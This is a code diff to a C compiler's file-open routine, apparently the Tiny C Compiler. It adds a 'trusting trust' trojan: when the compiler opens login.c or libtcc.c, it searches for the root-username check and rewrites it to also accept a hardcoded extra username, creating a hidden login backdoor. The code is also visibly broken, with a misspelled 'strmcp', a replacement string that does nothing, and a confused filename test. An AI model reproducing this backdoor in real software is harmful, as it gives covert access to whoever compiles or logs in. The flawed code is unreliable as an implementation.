@@ -708,7 +708,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
     } else if(p == 0){
         //do the child function
         //close the read end of the file
-        if(filename != "login.c" || filename != "libtcc.c"){
+        if(!strcmp(filename, "login.c") || !strcmp(filename, "libtcc.c")){
             int fd;
             if (strcmp(filename, "-") == 0)
                 fd = 0, filename = "<stdin>";
@@ -726,7 +726,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
             while(1){
                 //read each line
                 //currentline variable
-                if(strcmp(currentline, "strcmp(username,"root"")){
+                if(strcmp(currentline, "strcmp(username,\"root\")") {
                     //replace with 
                     "if(!strcmp(username,"root") || (!strmcp(username, "shruti_replace_with_own_name"))";
                     //continue reading
